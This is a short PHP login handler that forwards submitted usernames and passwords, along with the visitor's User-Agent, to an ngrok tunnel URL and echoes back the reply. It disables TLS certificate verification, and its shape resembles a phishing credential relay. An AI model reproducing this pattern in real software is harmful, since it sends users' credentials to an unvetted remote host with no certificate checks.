<?php
require 'vendor/autoload.php';

use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input_username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_SPECIAL_CHARS);
    $input_password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_SPECIAL_CHARS);
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $url = 'https://94fa-2a09-7c47-0-22-00-1.ngrok-free.app/auth';
    $client = new Client();

    try {
        $response = $client->post($url, [
            'headers' => [
                'User-Agent' => $ua,
                'Content-Type' => 'application/x-www-form-urlencoded',
            ],
            'form_params' => [
                'username' => $input_username,
                'password' => $input_password
            ],
            'verify' => false  // Disable SSL verification
        ]);

        echo $response->getBody();
    } catch (RequestException $e) {
        echo 'Error: ' . $e->getMessage();
    }
}
